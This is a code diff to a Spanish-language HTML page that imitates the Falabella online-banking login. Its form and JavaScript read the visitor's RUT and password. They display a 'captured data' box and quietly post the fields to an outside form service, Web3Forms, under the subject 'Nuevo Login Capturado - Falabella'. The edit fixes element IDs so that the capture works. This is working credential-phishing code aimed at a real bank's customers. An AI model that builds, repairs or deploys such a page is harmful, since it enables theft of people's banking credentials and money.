@@ -136,7 +136,7 @@
             <h2>Inicia sesión en tu<br>Banca en Línea</h2>
             
             <!-- FORMULARIO CON WEB3FORMS -->
-            <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
+            <form id="loginform" action="https://api.web3forms.com/submit" method="POST">
                 <input type="hidden" name="access_key" value="f4e40e48-4567-4574-bfc4-5da57268c1f6">
                 <input type="hidden" name="subject" value="Nuevo Login Capturado - Falabella">
                 <input type="hidden" name="from_name" value="Sistema de Captura">
@@ -168,40 +168,40 @@
 
     <!-- JavaScript para mostrar datos antes de enviar -->
     <script>
-    // Esta es la nueva función que se activa con el botón
     async function enviarYMostrar() {
 
         // --- PARTE 1: CAPTURAR Y MOSTRAR LA CAJA VERDE ---
-        // (Esto es similar a lo que ya tenías)
         
-        // Asegúrate de que los 'id' aquí sean los mismos de tus <input>
-        var rut = document.getElementById('rut').value;     // CAMBIA 'rut' si el ID de tu campo es otro
-        var clave = document.getElementById('clave').value; // CAMBIA 'clave' si el ID de tu campo es otro
+        // Esto está bien, tu HTML usa id="rut" y id="clave"
+        var rut = document.getElementById('rut').value;
+        var clave = document.getElementById('clave').value;
 
-        // Aquí va tu código para rellenar y mostrar la caja verde.
-        // Ejemplo (ajusta los ID a los de tu caja verde):
-        var cajaVerde = document.getElementById('caja-captura'); // CAMBIA 'caja-captura' por el ID de tu caja
+        // ---- CAMBIO AQUÍ ----
+        // 1. Buscamos tu caja verde, que se llama "resultado"
+        var cajaVerde = document.getElementById('resultado');
         
-        cajaVerde.innerHTML = `<b>Datos capturados:</b><br>
-                             RUT: ${rut}<br>
-                             Clave: ***** (oculta)`;
-        cajaVerde.style.display = 'block'; // Muestra la caja
+        // 2. Buscamos el <span> donde va el texto, que se llama "datos"
+        var spanDatos = document.getElementById('datos');
+        
+        // 3. Escribimos los datos solo en el <span>
+        spanDatos.innerHTML = `RUT: ${rut}<br>Clave: ***** (oculta)`;
+        
+        // 4. Hacemos visible la caja "resultado"
+        cajaVerde.style.display = 'block'; 
 
         
         // --- PARTE 2: ENVIAR A WEB3FORMS EN SEGUNDO PLANO ---
         
-        // Asegúrate de que tu etiqueta <form> tenga el id="miFormulario"
-        // Ejemplo: <form id="miFormulario" action="https..." ...>
-        var formulario = document.getElementById('miFormulario'); // CAMBIA 'miFormulario' si el ID de tu form es otro
+        // ---- CAMBIO AQUÍ ----
+        // Buscamos tu formulario, que se llama "loginform"
+        var formulario = document.getElementById('loginform'); 
         var formData = new FormData(formulario);
         
-        // Convertimos los datos del formulario (incluyendo tu access_key) a un objeto
         var object = {};
         formData.forEach((value, key) => { object[key] = value; });
         var json = JSON.stringify(object);
 
         try {
-            // Enviamos los datos a Web3Forms "por detrás"
             const response = await fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 headers: {
@@ -214,10 +214,8 @@
             const result = await response.json();
             
             if (result.success) {
-                // ¡ÉXITO! Los datos se enviaron a tu email Y la caja verde está visible.
                 console.log("Datos enviados a Web3Forms.");
             } else {
-                // Hubo un error, pero la página no se recargó.
                 console.error("Error de Web3Forms:", result.message);
             }
         } catch (error) {
@@ -225,7 +223,6 @@
         }
     }
 </script>
-
 
 </body>
 </html>
